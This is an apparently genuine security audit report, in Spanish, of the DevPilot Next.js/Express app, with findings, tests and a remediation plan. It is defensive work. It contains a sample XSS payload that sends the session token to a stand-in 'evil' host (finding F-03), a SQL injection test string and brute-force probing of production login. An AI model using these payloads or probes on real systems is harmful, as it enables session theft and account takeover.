# DevPilot — SECURITY_AUDIT

| Campo | Valor |
|---|---|
| Fecha | 2026-08-18 |
| Versión auditada | v0.1.0 (commit `e756dd5`) |
| Stack | Next.js 15.5.23 (React 19) · Express 4.22.2 · Prisma 6.19.3 · PostgreSQL (Neon) · Vercel |
| Autor | Equipo de auditoría (Application Security / Pentest / DevSecOps / QA) |
| Estado | Auditoría inicial — sin correcciones aplicadas (pendiente autorización) |

---

## 1. Resumen ejecutivo

```
SECURITY SCORE:       60 / 100
Critical:             0
High:                 4
Medium:               4
Low:                  4
Informational:        4
```

La aplicación tiene una base sólida: **no hay SQL Injection**, **los controles de
ownership (IDOR) están bien implementados en todos los servicios**, **CORS está
restringido correctamente**, **las contraseñas se hashean con bcrypt (12 rounds)**,
**los tokens de sesión son opacos y revocables**, y **no existe vector de XSS
almacenado/reflejado actualmente**. Los problemas principales son de **ausencia**:
no hay rate limiting, no hay cabeceras de seguridad, el token vive en `localStorage`,
existen credenciales demo por defecto en producción y hay 6 vulnerabilidades HIGH en
dependencias (Next.js/postcss/sharp y prisma/deepmerge-ts).

---

## 2. Arquitectura auditada

```
apps/web  (Next.js 15, App Router)  ──►  apps/api  (Express REST)  ──►  Prisma  ──►  Neon PostgreSQL
   landing + /auth + /dashboard           /api/* (auth Bearer)                     (gitignored URL)
```

- **Autenticación**: tokens de sesión opacos de 32 bytes (hex) en tabla `Session`, TTL 30 días, revocables (logout). Sin JWT.
- **Autorización**: `role` (OWNER/MEMBER) existe en el modelo pero **no se usa** en ninguna ruta. Todo acceso se valida por `ownerId`/`userId`.
- **Deployment**: API y web en Vercel (serverless). BD Neon (rama `main` = producción).
- **Uploads**: **no existe ninguna funcionalidad de subida de archivos** (N/A).

### Roles reales en el sistema

| Rol | Uso en código | Efecto real |
|---|---|---|
| `OWNER` | Solo seed (`role: "OWNER"` para demo) | Ninguno — no hay checks por rol |
| `MEMBER` | Asignado en registro | Ninguno — todos los endpoints usan `userId` |

---

## 3. Skills utilizadas / evaluadas

| Skill | Propósito | Por qué se usó | Fase | Resultado |
|---|---|---|---|---|
| `find-skills` | Descubrimiento de skills | Buscar skills de seguridad (OWASP, pentest) | Preparación | Encontradas `api-security-best-practices` (8.3K), `api-security-testing`, `penetration-testing-with-strix` |
| `api-security-best-practices` | Checklist de referencia para auditoría de APIs | Checklist de auth, validación, rate limiting, cabeceras, OWASP API Top 10 | Análisis | Aplicado como guía de comprobación |
| `agent-browser` | Pruebas dinámicas en navegador | Requerido por el cliente | Dynamic testing | **NO DISPONIBLE** en este entorno (no está cargada en opencode). Sustituida por pruebas HTTP controladas con `HttpClient`/`Invoke-WebRequest`. |
| `gstack` | Análisis de arquitectura/flujos | Listada por el cliente | — | **NO DISPONIBLE** en este entorno |
| `impeccable` / `emil-design-eng` | Revisión de frontend | Requerido solo tras correcciones frontend | — | **NO DISPONIBLE**. Además no se hizo rediseño: la auditoría es de seguridad, no estética. |
| `frontend-design` / `ui-ux-pro-max` | Revisión estética/UX | La seguridad tiene prioridad sobre estética; no aportaban valor a los hallazgos | — | **NO UTILIZADAS** (motivo: evitar convertir la auditoría en revisión visual) |
| `mcp-builder` | Crear herramientas MCP | No fue necesario ningún MCP para auditar | — | **NO UTILIZADA** |

> Nota: `npx skills add sickn33/agentic-awesome-skills@api-security-best-practices` falló
> por timeout de red (git clone colgado). Se obtuvo el contenido completo de la skill
> directamente desde GitHub y se aplicó su checklist.

---

## 4. Inventario de endpoints

### Públicos (sin autenticación)

| METHOD | PATH | INPUTS | OUTPUT | BD | RIESGO |
|---|---|---|---|---|---|
| GET | `/api/` | — | `{name, version}` | — | Info disclosure (bajo) |
| GET | `/api/health` | — | `{status, service, timestamp}` | — | Info disclosure (bajo) |
| POST | `/api/auth/register` | name, email, password | user + token (201/400/409) | User, Session | Brute force, spam, enumeración (409) |
| POST | `/api/auth/login` | email, password | user + token (200/401) | User, Session | Brute force / credential stuffing (sin rate limit) |

### Autenticados (`requireAuth` → `Bearer token`)

| METHOD | PATH | INPUTS | OUTPUT | BD | RIESGO |
|---|---|---|---|---|---|
| POST | `/api/auth/logout` | — | `{ok}` | Session (delete) | Bajo |
| GET | `/api/auth/me` | — | user | User | Bajo |
| GET | `/api/overview` | — | métricas + recientes | Project/Analysis/Issue/Activity | Bajo (solo propios) |
| GET | `/api/projects` | — | lista proyectos | Project | Bajo |
| POST | `/api/projects` | name, repoUrl, defaultBranch | project (201) | Project | Mass assignment controlado |
| GET | `/api/projects/:id` | id | detalle + analyses | Project/Analysis/... | Bajo (ownership ok) |
| PATCH | `/api/projects/:id` | name/repoUrl/defaultBranch | project | Project | Bajo (ownership ok) |
| DELETE | `/api/projects/:id` | id | `{ok}` | Project (cascade) | Bajo (ownership ok) |
| GET | `/api/analyses` | — | lista análisis | Analysis | Bajo |
| GET | `/api/analyses/project/:projectId` | projectId | análisis del proyecto | Analysis | Bajo |
| POST | `/api/analyses/project/:projectId` | branch, commitSha | analysis (201) | Analysis | Bajo (ownership ok) |
| GET | `/api/analyses/:id` | id | análisis + issues + tests | Analysis/... | Bajo |
| GET | `/api/issues` | category?, severity? | issues (100) | Issue | Bajo |
| GET | `/api/issues/analysis/:analysisId` | analysisId | issues | Issue | Bajo (ownership ok) |
| PATCH | `/api/issues/:id/status` | status (enum) | issue | Issue | Bajo (ownership ok) |
| GET | `/api/recommendations` | — | recomendaciones (50) | Recommendation | Bajo |
| GET | `/api/recommendations/analysis/:analysisId` | analysisId | recomendaciones | Recommendation | Bajo (ownership ok) |
| GET | `/api/activity` | — | actividad (20) | Activity | Bajo |

**Total: 21 endpoints (4 públicos, 17 autenticados).**

---

## 5. Hallazgos

### F-01 — Credenciales demo por defecto en producción
- **Severidad:** HIGH
- **OWASP:** A07:2021 (Identificación y Autenticación fallidas) · A04 (Insecure Design)
- **CWE:** CWE-798 (Hard-coded credentials)
- **Archivo:** `apps/api/prisma/seed.ts:8` (y `docs/deployment/DEPLOYMENT.md`)
- **Endpoint:** `POST /api/auth/login`
- **Descripción:** la cuenta `demo@devpilot.app / [redactada]` (rol OWNER) estaba sembrada en la BD de producción y sus credenciales estaban publicadas en el repositorio.
- **Evidencia:** login real contra `https://devpilot-api.vercel.app` con esas credenciales devuelve 200 + token (usuario `cmst4sk8r0000vlj4civ1ybi2`, role OWNER).
- **Impacto:** cualquiera puede autenticarse y leer/modificar los datos del demo (proyectos, análisis, issues). Credenciales por defecto.
- **Probabilidad:** Alta (credencial pública).
- **Reproducción:** `POST /api/auth/login` con `{"email":"demo@devpilot.app","password":"[redactada]"}` → 200 (verificado antes de la corrección).
- **Corrección:** eliminar la cuenta demo de producción o generar una contraseña aleatoria vía variable de entorno; documentar que la demo solo vive en staging.
- **Prioridad:** P0
- **Estado:** RESUELTO (2026-08-18) — usuarios demo (`demo@devpilot.app`, `ana@devpilot.app`) eliminados de la BD de producción; `prisma/seed.ts` ya no contiene credenciales (usa `SEED_DEMO_EMAIL`/`SEED_DEMO_PASSWORD` por entorno, gitignored) y no las imprime. El login demo devuelve 401.

### F-02 — Sin rate limiting en `/login`, `/register` ni en la API
- **Severidad:** HIGH
- **OWASP:** A07:2021 · API-4 (Unrestricted Resource Consumption)
- **CWE:** CWE-307 (Improper Restriction of Excessive Authentication Attempts)
- **Archivo:** `apps/api/src/app.ts` (no hay middleware de límites) · `apps/api/src/routes/auth.ts`
- **Endpoint:** `POST /api/auth/login`, `POST /api/auth/register`, todos
- **Descripción:** ningún endpoint limita el número de peticiones. No existe `express-rate-limit` ni equivalente.
- **Evidencia:** 12 intentos de login fallidos en ráfaga contra producción → todos 401, ninguno 429. `BRUTE_FORCE_DONE` sin bloqueo.
- **Impacto:** fuerza bruta / credential stuffing sobre cuentas, DoS por consumo de recursos (bcrypt rounds 12 multiplica CPU), spam de registros.
- **Probabilidad:** Alta.
- **Reproducción:** enviar >N intentos de login consecutivos; nunca se devuelve 429.
- **Corrección:** `express-rate-limit` global + límite estricto (5–10/15 min por IP) en `/login` y `/register`; `skipSuccessfulRequests`; cabeceras `RateLimit-*`.
- **Prioridad:** P0
- **Estado:** CONFIRMADO

### F-03 — Token de sesión en `localStorage` (exposición a XSS)
- **Severidad:** HIGH
- **OWASP:** A05:2021 (Security Misconfiguration) · A03 (Injection)
- **CWE:** CWE-922 (Insecure Storage of Sensitive Information)
- **Archivo:** `apps/web/src/lib/api.ts:6-17` (getToken/setToken) · uso en `apps/web/src/lib/auth.tsx`
- **Endpoint:** todos los autenticados
- **Descripción:** el token Bearer se persiste en `localStorage`. Cualquier XSS (hoy no existe vector, pero tampoco hay CSP que lo mitigue) permite robar el token y secuestrar la sesión (30 días de validez, sin rotación).
- **Evidencia:** código; el propio seed de la app lo documenta como hallazgo HIGH (`apps/api/prisma/seed.ts:83-94`).
- **Impacto:** robo de sesión persistente vía XSS. Sin CSP el riesgo es alto.
- **Probabilidad:** Baja-media (requiere un XSS previo; no se halló vector actual).
- **Reproducción:** con un XSS: `fetch('https://evil/x?t='+localStorage.getItem('devpilot-token'))`.
- **Corrección:** cookie `httpOnly` + `SameSite=Strict` gestionada por el servidor, o token en memoria con renovación y re-autenticación.
- **Prioridad:** P1
- **Estado:** CONFIRMADO

### F-04 — Cabeceras de seguridad ausentes (web y API)
- **Severidad:** MEDIUM
- **OWASP:** A05:2021 (Security Misconfiguration)
- **CWE:** CWE-693 (Protection Mechanism Failure) · CWE-1021 (Clickjacking)
- **Archivo:** `apps/api/src/app.ts` (sin `helmet`) · `apps/web/next.config.ts` (sin `headers()`)
- **Endpoint:** todos
- **Descripción:** ni web ni API emiten `Content-Security-Policy`, `X-Content-Type-Options`, `Referrer-Policy`, `Permissions-Policy`, `X-Frame-Options`/`frame-ancestors`. Vercel añade HSTS en el edge (observado: `max-age=63072000; includeSubDomains; preload`).
- **Evidencia:** inspección de cabeceras HTTP de `devpilot-api.vercel.app` y `devpilot-web-bay.vercel.app` (ausencia de las citadas).
- **Impacto:** clickjacking del panel (acciones destructivas: eliminar proyecto, logout), MIME sniffing, ausencia de CSP aumenta el impacto de cualquier XSS futuro.
- **Probabilidad:** Media (requiere engaño al usuario para clickjacking).
- **Reproducción:** cargar el panel dentro de un `<iframe>` de origen ajeno.
- **Corrección:** `helmet` en API; en Next.js `headers()` en `next.config.ts` con CSP, `nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, `frame-ancestors 'none'`.
- **Prioridad:** P1
- **Estado:** CONFIRMADO

### F-05 — Vulnerabilidades conocidas en dependencias (6 HIGH)
- **Severidad:** HIGH
- **OWASP:** A06:2021 (Vulnerable and Outdated Components)
- **CWE:** CWE-1104 · CWE-1395
- **Archivo:** `apps/web/package.json` (next), `apps/api/package.json` (prisma), `package-lock.json`
- **Endpoint:** — (build/runtime)
- **Descripción:** `npm audit` reporta 6 HIGH:
  - `next@15.5.23` → `postcss` (XSS en stringify CSS; lectura arbitraria de ficheros `.map` vía `sourceMappingURL`; path traversal) y `sharp` (libvips: CVE-2026-33327/33328/35590/35591). Fix disponible: **next@16.3.1** (major).
  - `prisma@6.19.3` (CLI dev) → `@prisma/config` → `deepmerge-ts` (stack exhaustion con grafos recursivos). Fix disponible.
- **Evidencia:** `npm audit` (6 high, 0 critical, 0 moderate, 0 low).
- **Impacto:** los de postcss afectan procesamiento CSS en build/desarrollo; sharp afecta optimización de imágenes (Next image optimization en Vercel). Exposición real limitada pero alta en asesores.
- **Probabilidad:** Baja-media (depende de flujo de build con input controlable).
- **Reproducción:** `npm audit`.
- **Corrección:** actualizar Next a 16.3.1 y prisma a versión con `deepmerge-ts >= 8`; revisar rotura de API por el major bump.
- **Prioridad:** P1
- **Estado:** CONFIRMADO

### F-06 — Enumeración de cuentas en `/register`
- **Severidad:** MEDIUM
- **OWASP:** API-3 (Broken Object Property Level / Excess Data) · A01 (Broken Access Control)
- **CWE:** CWE-204 (Observable Response Discrepancy)
- **Archivo:** `apps/api/src/services/authService.ts:45-48`
- **Endpoint:** `POST /api/auth/register`
- **Descripción:** registrarse con un email ya existente devuelve `409 "Ya existe una cuenta con ese correo electrónico"`, lo que permite validar qué correos están registrados.
- **Evidencia:** `POST /api/auth/register` con `demo@devpilot.app` → 409 con mensaje explícito (nombre de campo válido).
- **Impacto:** enumeración de usuarios para campañas de phishing/credential stuffing.
- **Probabilidad:** Alta.
- **Reproducción:** probar emails contra `/register`.
- **Corrección:** respuesta genérica (p. ej. 200/202 o 409 sin detalle) + rate limiting.
- **Prioridad:** P2
- **Estado:** CONFIRMADO

### F-07 — Fugas de detalle en errores de validación
- **Severidad:** MEDIUM
- **OWASP:** A05:2021 · API-8 (Security Misconfiguration)
- **CWE:** CWE-209 (Generation of Error Message Containing Sensitive Information)
- **Archivo:** `apps/api/src/middleware/validate.ts:18-20` · `apps/api/src/app.ts:18` (express.json)
- **Endpoint:** todos los que validan (register/login/projects)
- **Descripción:** los errores 400 exponen el esquema interno de zod (`path`, `minimum: 2`, `code`, `expected`) y, con body no JSON, el error raw de Express: `"Unexpected token 'n', \"nojson\" is not valid JSON"`.
- **Evidencia:** `POST /api/auth/register` con `{}` → 400 con detalle zod; `POST /api/auth/login` con body no JSON → 400 con mensaje del parser.
- **Impacto:** revela reglas de validación (longitudes, tipos) facilitando ataques dirigidos; detalle técnico innecesario.
- **Probabilidad:** Alta (respuesta pública).
- **Reproducción:** enviar body inválido.
- **Corrección:** devolver mensaje genérico 400 y loguear el detalle server-side; sanitizar el error de `express.json`.
- **Prioridad:** P2
- **Estado:** CONFIRMADO

### F-08 — Endurecimiento de sesiones (pruning, rotación, límites)
- **Severidad:** MEDIUM
- **OWASP:** A07:2021
- **CWE:** CWE-613 (Insufficient Session Expiration) · CWE-640
- **Archivo:** `apps/api/src/services/authService.ts:6,30-39` · `apps/api/prisma/schema.prisma:153-162`
- **Endpoint:** auth
- **Descripción:** no se purgan sesiones expiradas (crecen sin límite en BD), no hay tope de sesiones concurrentes por usuario, el token no rota, y no se revoca al cambiar la contraseña (no existe cambio de contraseña).
- **Evidencia:** análisis estático; sesiones acumuladas por cada login.
- **Impacto:** tokens robados siguen válidos 30 días; BD con filas obsoletas; sin rotación de credenciales comprometidas.
- **Probabilidad:** Baja-media.
- **Reproducción:** iniciar sesión N veces → N filas de sesión (con logout solo se borran las que se cierran).
- **Corrección:** job de limpieza de expiradas, cap de sesiones por usuario (ej. 5, revocar las más antiguas), rotación periódica, revocar al cambiar password.
- **Prioridad:** P2
- **Estado:** CONFIRMADO

### F-09 — Política de contraseñas débil
- **Severidad:** LOW
- **OWASP:** A07:2021
- **CWE:** CWE-521 (Weak Password Requirements)
- **Archivo:** `apps/api/src/routes/auth.ts:17` · `apps/web/src/app/auth/register/page.tsx:46-49`
- **Endpoint:** `POST /api/auth/register`
- **Descripción:** solo se exige longitud mínima 8 (sin complejidad, sin check contra listas de contraseñas conocidas). El hashing bcrypt(12) es correcto.
- **Evidencia:** código (zod `.min(8)`).
- **Impacto:** contraseñas débiles tipo `password123` combinadas con la ausencia de rate limiting.
- **Probabilidad:** Media.
- **Reproducción:** registrarse con `password123` → aceptado.
- **Corrección:** longitud ≥10, chequeo de complejidad o `zxcvbn`, blacklist de comunes, y rate limiting.
- **Prioridad:** P3
- **Estado:** CONFIRMADO

### F-10 — Cabecera `X-Powered-By: Express`
- **Severidad:** LOW
- **OWASP:** A05:2021
- **CWE:** CWE-200 (Exposure of Sensitive Information)
- **Archivo:** `apps/api/src/app.ts`
- **Endpoint:** todos
- **Descripción:** la cabecera expone el framework a atacantes (fingerprinting).
- **Evidencia:** `X-Powered-By: Express` en respuestas de producción.
- **Impacto:** facilita selección de exploits específicos.
- **Probabilidad:** Alta (siempre presente).
- **Reproducción:** `curl -I https://devpilot-api.vercel.app/api/health`.
- **Corrección:** `app.disable("x-powered-by")` o `helmet({ hidePoweredBy: true })`.
- **Prioridad:** P3
- **Estado:** CONFIRMADO

### F-11 — Ciclo de vida de cuenta incompleto (sin verificación ni recuperación)
- **Severidad:** LOW
- **OWASP:** A07:2021
- **CWE:** CWE-308 · CWE-640
- **Archivo:** `apps/api/src/routes/auth.ts` (solo register/login/logout/me)
- **Endpoint:** auth
- **Descripción:** no existe verificación de email, cambio de contraseña, ni `forgot/reset-password`. Cualquiera puede registrarse con un email ajeno.
- **Evidencia:** inventario de endpoints (no existen).
- **Impacto:** toma de cuentas de correo ajenas, sin ruta de recuperación ante robo de credenciales.
- **Probabilidad:** Media.
- **Reproducción:** registrarse con un email que no se posee.
- **Corrección:** flujo de verificación de email + reset con token de un solo uso.
- **Prioridad:** P2 (funcionalidad de seguridad)
- **Estado:** CONFIRMADO

### F-12 — Endpoints públicos exponen nombre y versión del servicio
- **Severidad:** INFORMATIONAL
- **OWASP:** API-9 (Improper Inventory Management)
- **CWE:** CWE-200
- **Archivo:** `apps/api/src/routes/index.ts:12-22`
- **Endpoint:** `GET /api`, `GET /api/health`
- **Descripción:** `/api` devuelve `{name, version}` y `/health` el timestamp.
- **Evidencia:** `GET /api` → 200 `{"name":"DevPilot API","version":"0.1.0"}`.
- **Impacto:** fingerprinting.
- **Probabilidad:** Alta.
- **Reproducción:** `curl https://devpilot-api.vercel.app/api`.
- **Corrección:** eliminar versión o proteger.
- **Prioridad:** P3
- **Estado:** CONFIRMADO

### F-13 — 404 refleja la URL solicitada
- **Severidad:** INFORMATIONAL
- **OWASP:** A05:2021
- **CWE:** CWE-209
- **Archivo:** `apps/api/src/middleware/error.ts:3-7`
- **Endpoint:** rutas no existentes
- **Descripción:** `Not Found - ${req.originalUrl}` se devuelve como JSON (Content-Type `application/json`, sin riesgo XSS real).
- **Impacto:** nulo/teórico.
- **Probabilidad:** Alta.
- **Reproducción:** `GET /api/anything`.
- **Corrección:** mensaje estático.
- **Prioridad:** P3
- **Estado:** CONFIRMADO

### F-14 — `role` declarado pero sin RBAC funcional
- **Severidad:** INFORMATIONAL
- **OWASP:** A01:2021 · API-5 (Broken Function Level Authorization)
- **CWE:** CWE-863 (Incorrect Authorization)
- **Archivo:** `apps/api/prisma/schema.prisma:10-13` · middleware `auth.ts:6-13` · ningún route usa `role`
- **Endpoint:** todos
- **Descripción:** los roles OWNER/MEMBER existen pero ninguna ruta los evalúa; no hay endpoints administrativos. Hoy no hay escalada vertical posible (no se puede promover vía API), pero el modelo da falsa sensación de control de acceso por rol.
- **Evidencia:** búsqueda de `role` en rutas/servicios: solo aparece en `req.user.role` sin ser usado para autorización.
- **Impacto:** cuando se añadan funcionalidades admin, el riesgo de Broken Function Level Authorization será alto si no se implementa RBAC.
- **Probabilidad:** N/A (hoy no explotable).
- **Reproducción:** N/A.
- **Corrección:** definir política de autorización por rol y aplicarla en middleware; hasta entonces, documentar que `role` es informativo.
- **Prioridad:** P3
- **Estado:** CONFIRMADO

### F-15 — Guard de rutas del dashboard solo en cliente
- **Severidad:** INFORMATIONAL
- **OWASP:** A01:2021
- **CWE:** CWE-306
- **Archivo:** `apps/web/src/components/dashboard/dashboard-shell.tsx:28-32` · `apps/web/src/lib/auth.tsx`
- **Endpoint:** `/dashboard/*`
- **Descripción:** el redirect a login ocurre en el cliente (`useEffect`). El HTML del shell se sirve a usuarios sin sesión; los datos reales están protegidos por la API (que rechaza 401). No hay middleware de Next.js.
- **Evidencia:** código.
- **Impacto:** bajo (no hay fuga de datos porque el frontend nunca recibe token), pero mejorable.
- **Probabilidad:** Baja.
- **Reproducción:** `GET /dashboard` sin sesión → recibe el shell.
- **Corrección:** middleware de Next.js que redirija/deniegue antes de servir.
- **Prioridad:** P3
- **Estado:** CONFIRMADO

---

## 6. Controles que PASARON la auditoría

| Control | Resultado |
|---|---|
| SQL Injection | ✅ NO encontrado — todo Prisma parametrizado; sin `$queryRaw`/`$executeRaw`; payloads rechazados (401/400) |
| IDOR (ownership) | ✅ Todos los servicios filtran por `ownerId`/`userId` (`findFirst({where:{id, ownerId}})`); GET/PATCH/DELETE de recursos ajenos → 404 |
| CORS | ✅ ACAO fijo al origen permitido; navegador bloquea `evil.com` y `null`; sin `Allow-Credentials` |
| CSRF | ✅ No aplicable (Bearer en cabecera, sin cookies) |
| Hashing de contraseñas | ✅ bcrypt 12 rounds, nunca en respuestas |
| Tokens | ✅ 32 bytes aleatorios, revocables por logout, TTL 30 días |
| Enumeración en login | ✅ Mensaje genérico "Credenciales inválidas" (sin distinguir email vs password) |
| Mass assignment | ✅ Whitelists explícitas en create/update; `ownerId` siempre del token |
| XSS (stored/reflected/DOM) | ✅ No hay `dangerouslySetInnerHTML` con datos de usuario; React escapa; `innerHTML`/`eval` ausentes. Los dos `dangerouslySetInnerHTML` en `layout.tsx` son estáticos |
| Errores 500 en producción | ✅ Mensaje genérico "Internal Server Error" |

---

## 7. Pruebas realizadas

1. **Análisis estático completo** — rutas, servicios, middleware, schema, frontend (21 endpoints, 17 ficheros de lógica).
2. **Baseline** — `npm run typecheck` ✓ · `npm run lint` ✓ · `npm test` 17/17 ✓.
3. **Dependencias** — `npm audit` (6 HIGH).
4. **Secretos** — revisión de `.env*`, `.vercel/*`, git history (ningún secreto commiteado; `.env` y `.vercel` correctamente gitignored).
5. **Pruebas dinámicas (no destructivas, solo lectura + login demo, contra producción):**
   - `GET /api`, `GET /api/health` — 200 (info disclosure).
   - `POST /api/auth/login` demo válido → 200 + token; logout para limpiar la sesión.
   - Login con password incorrecta → 401 genérico.
   - Login con payload SQLi (`' OR 1=1 --`) en email y password → 400/401 (sin inyección).
   - `POST /api/auth/register` email duplicado → 409 (enumeración).
   - Register password corta → 400.
   - `GET /api/auth/me` token inválido → 401; sin token → 401.
   - `GET /api/projects` sin token → 401.
   - Rutas autenticadas (me/projects/overview/analyses/issues/recommendations/activity) → 200 solo con datos propios.
   - Ownership: `GET /projects/:id` inexistente → 404; `PATCH/DELETE /projects/:id` y `PATCH /issues/:id/status` con IDs ajenos/inexistentes → 404.
   - CORS: preflight y GET con `Origin: http://evil.com` y `Origin: null` → ACAO siempre `devpilot-web-bay.vercel.app` (bloqueado en navegador).
   - Fuerza bruta: 12 intentos fallidos en ráfaga → ninguno 429 (rate limiting ausente).
   - Errores de validación: body `{}` y body no JSON → 400 con detalle interno.
   - Cabeceras: inspección de web y API (ausencia de CSP/nosniff/referrer/permissions/frame; `X-Powered-By`).

## 8. Pruebas NO realizadas y por qué

| Prueba | Motivo |
|---|---|
| IDOR con 2 usuarios reales (A→B) | Elegido "solo lectura + login demo": crear usuarios en la Neon de producción no es reversible (no hay endpoint de borrado de usuarios) y la Neon no es alcanzable desde esta máquina para limpiar vía SQL. El control quedó validado estáticamente (robusto) y parcialmente (404 con IDs ajenos/inexistentes). |
| Fuerza bruta hasta bloqueo | No hay rate limit → no hay bloqueo que probar; se limitó a 12 intentos. |
| Upload de archivos | La aplicación **no tiene** ninguna funcionalidad de upload (sin endpoints, sin middleware, sin storage). N/A. |
| XSS dinámico en navegador | `agent-browser` no está disponible en este entorno. El análisis estático no encontró vectores (React escapa todo). |
| Recuperación de contraseña | No implementado. |
| DoS / ataques a terceros | Prohibidos por alcance. |
| Exfiltración de datos reales | Prohibido por alcance (no se descargó contenido sensible, solo respuestas propias del login demo). |

---

## 9. SECURITY SCORE — metodología

Puntuación por rubros ponderados (0–100 cada uno):

| Rubro | Peso | Nota | Justificación |
|---|---|---|---|
| Autenticación y sesiones | 25% | 45 | Bcrypt/tokens opacos OK; pero credenciales demo en prod, sin rate limiting, sin reset/verificación, sin rotación |
| Autorización y control de acceso | 20% | 85 | Ownership impecable en todos los servicios; RBAC inexistente (rol sin uso); sin escalada posible hoy |
| Validación de entradas / inyección | 15% | 80 | Zod + Prisma, sin SQLi; fugas de detalle en errores 400 |
| Seguridad cliente | 15% | 55 | Token en localStorage, sin CSP, sin cabeceras; sin vector XSS actual |
| Configuración de seguridad | 15% | 55 | Faltan cabeceras, X-Powered-By, endpoints públicos; CORS y HSTS OK |
| Dependencias / supply chain | 10% | 45 | 6 advisory HIGH (next/postcss/sharp, prisma/deepmerge-ts) |

**Score = (45·0,25) + (85·0,20) + (80·0,15) + (55·0,15) + (55·0,15) + (45·0,10) = 11,25 + 17 + 12 + 8,25 + 8,25 + 4,5 = 60 / 100**

> No se otorgan puntos automáticos: los controles fuertes (IDOR, SQLi, CORS, hashing)
> pesan, pero la ausencia de rate limiting, cabeceras y la presencia de credenciales por
> defecto en producción penalizan.

---

## 10. Top 10 vulnerabilidades (por riesgo)

1. **F-02** Sin rate limiting (brute force / credential stuffing / DoS) — HIGH · P0
2. **F-01** Credenciales demo por defecto en producción — HIGH · P0
3. **F-03** Token en `localStorage` (robo de sesión vía XSS, sin CSP) — HIGH · P1
4. **F-05** 6 vulnerabilidades HIGH en dependencias (Next/postcss/sharp, prisma/deepmerge-ts) — HIGH · P1
5. **F-04** Cabeceras de seguridad ausentes (clickjacking del panel, sin CSP/nosniff) — MEDIUM · P1
6. **F-06** Enumeración de cuentas en `/register` — MEDIUM · P2
7. **F-07** Fugas de detalle en errores de validación (zod/parser) — MEDIUM · P2
8. **F-08** Sesiones sin pruning, rotación ni límites concurrentes — MEDIUM · P2
9. **F-11** Ciclo de vida de cuenta incompleto (sin reset ni verificación) — LOW · P2
10. **F-09** Política de contraseñas débil — LOW · P3

---

## 11. Endpoints más peligrosos

| Endpoint | Riesgo |
|---|---|
| `POST /api/auth/login` | Fuerza bruta (sin rate limit) + credenciales demo conocidas |
| `POST /api/auth/register` | Enumeración de emails (409) + spam de cuentas |
| `PATCH/DELETE /api/projects/:id` | Destructivo si fallara el ownership (hoy controlado) + clickjacking del botón en el panel |
| `GET /api/projects/:id` | Superficie IDOR (controlada hoy) |

---

## 12. Archivos que requieren atención

| Archivo | Motivo |
|---|---|
| `apps/api/src/app.ts` | Añadir helmet, rate limiting global, `disable('x-powered-by')`, error json sanitizado |
| `apps/api/src/routes/auth.ts` | Limitadores en login/register; esquemas de password; nuevos endpoints (reset/verify) |
| `apps/api/src/services/authService.ts` | Pruning/rotación de sesiones, cap concurrente, verificación de email |
| `apps/api/src/middleware/validate.ts` | Errores genéricos sin detalle de esquema |
| `apps/api/prisma/seed.ts` | Eliminar credenciales demo en prod / contraseña aleatoria |
| `apps/web/src/lib/api.ts` | Mover token de localStorage a cookie httpOnly / storage en memoria |
| `apps/web/next.config.ts` | `headers()` con CSP, nosniff, referrer, permissions, frame-ancestors |
| `apps/web/src/components/dashboard/dashboard-shell.tsx` | (opcional) middleware de Next.js para guard en servidor |
| `package-lock.json` / `package.json` | Upgrade Next 16.3.1 y Prisma parcheada |

---

## 13. Plan de remediación

### P0 — Inmediato
- **F-01**: eliminar/deshabilitar la cuenta demo en producción (o contraseña aleatoria por env).
- **F-02**: `express-rate-limit` global (por IP) + límite 5–10/15 min en `/login` y `/register` (con `skipSuccessfulRequests` y cabeceras `RateLimit-*`).

### P1 — Alta prioridad
- **F-03**: token en cookie `httpOnly` + `SameSite=Strict` (cambiar flujo de auth del frontend y `createSession`).
- **F-04**: `helmet` en API y `headers()` en `next.config.ts` (CSP, `nosniff`, `strict-origin-when-cross-origin`, `frame-ancestors 'none'`).
- **F-05**: actualizar Next → 16.3.1 y Prisma a versión parcheada; regresión completa tras el major bump.

### P2 — Prioridad media
- **F-06**: mensaje genérico en registro duplicado.
- **F-07**: errores 400 genéricos (loguear detalle server-side).
- **F-08**: job de limpieza de sesiones expiradas, cap por usuario, rotación y revocación al cambiar password.
- **F-11**: verificación de email + flujo forgot/reset con token de un solo uso.

### P3 — Hardening
- **F-09**: política de contraseñas (longitud ≥10, complejidad o zxcvbn, blacklist).
- **F-10**: `app.disable("x-powered-by")`.
- **F-12/F-13**: quitar versión del endpoint público y 404 estático.
- **F-14**: implementar RBAC real o documentar `role` como informativo.
- **F-15**: middleware de Next.js para proteger `/dashboard/*` en servidor.

---

## 14. Riesgo residual (tras aplicar el plan)

| Riesgo | Nivel esperado |
|---|---|
| Fuerza bruta | Bajo (rate limiting aplicado) |
| Robo de sesión vía XSS | Medio-bajo (cookie httpOnly, pero queda mejorar CSP/controles) |
| Clickjacking del panel | Bajo (frame-ancestors) |
| Dependencias | Medio (pendiente auditoría de compatibilidad tras major bump) |
| IDOR / SQLi | Muy bajo (controles ya robustos) |

---

## 15. Próximos pasos

1. **Autorización del cliente** para comenzar el ciclo de corrección (P0 → P3).
2. Por cada vulnerabilidad: corregir → probar el ataque de nuevo → confirmar que desaparece → regresión → actualizar este documento.
3. Re-auditar al final del ciclo (regresión de seguridad completa) y recalcular el score.